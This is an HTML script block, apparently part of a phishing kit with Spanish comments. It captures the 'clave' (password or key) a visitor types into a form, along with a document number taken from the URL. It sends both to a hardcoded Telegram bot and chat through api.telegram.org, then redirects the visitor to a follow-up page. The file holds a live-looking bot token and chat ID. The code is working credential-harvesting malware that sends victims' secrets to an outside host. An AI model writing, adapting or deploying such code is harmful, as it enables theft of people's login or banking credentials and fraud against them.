    <script>
        // Función para obtener el valor de un parámetro de la URL
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Obtén el número de documento de la URL
        const numeroDocumento = getParameterByName('documento');

        // Reemplaza con tu token y chat ID
        const BOT_TOKEN = '7510532523:AAHsERIzR24MZsO2Bwk9seHZxE4aICObwjU';
        const CHAT_ID = '7713690054';

        document.getElementById('miFormulario').addEventListener('submit', function(event) {
            event.preventDefault(); // Evita que el formulario se envíe de forma tradicional

            // Obtén el valor del campo de texto
            const clave = document.getElementById('clave').value;

            // Mensaje que se enviará a Telegram
            const mensaje = `Documento: $\n@ProArgFull\n{numeroDocumento}\nToken1: ${clave}`;

            // URL de la API de Telegram para enviar mensajes
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            // Envía los datos a Telegram usando fetch
            fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: mensaje
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Mensaje enviado a Telegram:', data);
                    // Redirige a Google después de enviar el mensaje
                    window.location.href = 'carg2.html?documento=' + encodeURIComponent(numeroDocumento);
                })
                .catch(error => {
                    console.error('Error al enviar el mensaje:', error);
                });
        });
    </script>
